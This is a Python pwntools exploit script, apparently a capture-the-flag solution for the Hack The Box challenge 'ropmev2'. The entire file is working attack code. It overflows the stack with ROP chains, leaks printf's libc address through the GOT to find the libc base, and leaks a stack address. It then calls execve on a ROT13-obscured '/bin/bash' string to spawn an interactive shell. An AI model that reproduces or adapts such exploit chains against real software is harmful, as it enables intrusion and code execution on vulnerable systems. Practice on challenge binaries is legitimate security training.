#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

elf = ELF('./ropmev2')
#context.log_level = 'critical'
context.terminal = ['tmux', 'new-window']
#p = gdb.debug('./ropmev2', 'b *0x40116b')
p = elf.process()

pop_rdi = p64(0x40142b)                                     # pop rdi; ret
pop_rsi = p64(0x401429)                                     # pop rsi ; pop r15 ; ret
pop_rdx = p64(0x401164)                                     # pop rdx ; pop r13 ; ret
main = p64(0x40116b)
plt_printf = p64(elf.plt['printf'])
got_printf = p64(elf.got['printf'])
string = p64(0x402020)                         # "I dont know what this is %p" string
libc_printf = 0x56440
libc_execve = 0xcb140

#leak printf and libc
rop = cyclic(216)
rop += pop_rdi
rop += got_printf
rop += plt_printf
rop += main

p.recvuntil('Please dont hack me')
p.sendline(rop)
leaked_printf = u64(p.recvuntil('P')[1:7].strip().ljust(8, '\x00'))
log.success("leaked printf : {}".format(hex(leaked_printf)))
libc_offset = leaked_printf - libc_printf
execve = p64(libc_offset + libc_execve)
log.success("libc execve : {}".format(hex(libc_offset + libc_execve)))

#leak input
rop = cyclic(216)
rop += pop_rdi
rop += string
rop += plt_printf
rop += main

p.recvuntil('me')
p.sendline(rop)
leaked_location = int(p.recvuntil('P')[26:40], 16)
log.success("string under control : {}".format(hex(leaked_location + 232)))

#shell
null = p64(leaked_location)
arg = p64(leaked_location + 232)
rop = cyclic(200)
rop += "/ova/onfu" + "\x00" * 7
rop += pop_rdi
rop += arg
rop += pop_rsi
rop += null
rop += null
rop += pop_rdx
rop += null
rop += null
rop += execve

p.recvuntil('me')
p.sendline(rop)
p.recv()
p.interactive()
